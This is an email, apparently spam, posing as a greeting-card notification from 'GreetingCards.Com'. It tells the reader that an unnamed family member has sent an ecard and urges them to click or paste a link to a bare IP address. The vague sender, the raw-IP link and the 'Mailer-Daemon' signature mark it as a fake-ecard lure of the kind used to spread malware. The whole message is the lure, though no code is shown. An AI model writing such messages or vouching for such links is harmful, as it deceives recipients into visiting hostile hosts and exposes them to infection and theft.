<PRE>Hi. Family member has sent you an ecard.
See your card as often as you wish during the next 15 days.

SEEING YOUR CARD

If your email software creates links to Web pages, click on your 
card's direct www address below while you are connected to the Internet:

<A HREF="http://24.90.75.115/?a9b689077573383e1a7a85955">http://24.90.75.115/?a9b689077573383e1a7a85955</A>

Or copy and paste it into your browser's &quot;Location&quot; box (where Internet 
addresses go).

We hope you enjoy your awesome card.

Wishing you the best,
Mailer-Daemon,
GreetingCards.Com


</PRE>
